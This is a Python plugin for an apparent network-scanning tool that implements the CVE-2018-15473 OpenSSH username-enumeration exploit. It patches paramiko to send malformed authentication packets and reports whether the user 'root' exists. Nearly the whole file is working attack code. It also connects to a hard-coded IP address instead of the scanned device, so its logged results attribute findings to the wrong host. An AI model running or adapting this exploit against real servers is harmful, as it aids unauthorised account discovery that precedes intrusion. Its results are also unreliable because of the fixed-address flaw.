#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
*----------------*
|CVE-2018-15473  |
*----------------*
Sources:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15473
https://security.netapp.com/advisory/ntap-20181101-0001/
https://www.exploit-db.com/exploits/45233
https://github.com/Rhynorater/CVE-2018-15473-Exploit

"""
import warnings
import paramiko
import socket
import logging as log
from .IPlugin import IPlugin, connection_type

old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

class BadUsername(Exception):
	def __init__(self):
		pass

def add_boolean(*args, **kwargs):
    pass

def call_error(*args, **kwargs):
    raise BadUsername()

def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result  = old_parse_service_accept(*args, **kwargs)
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

def checkUsername(username, tried=0):
	sock = socket.socket()
	sock.connect(('51.38.179.48', 22))
	transport = paramiko.transport.Transport(sock)
	try:
	    transport.start_client()
	except paramiko.ssh_exception.SSHException:
	    transport.close()
	    if tried < 4:
	    	tried += 1
	    	return checkUsername(username, tried)
	    else:
	    	print ('[-] Failed to negotiate SSH transport')
	try:
		transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
	except BadUsername:
    		return (username, False)
	except paramiko.ssh_exception.AuthenticationException:
    		return (username, True)
	raise Exception("Error ??? CheckUsername")

paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error

class Plugin(IPlugin):
	def __init__(self):
		super().__init__()
		self.port = 22
		self.connection_type = connection_type.RAW

	def config(self):
		pass

	def exec(self, socket):
		res = checkUsername("root")
		log.info("plugin=openssh-15473 device={} username={} valid={}".format(socket.getpeername()[0], res[0], res[1]))
		pass
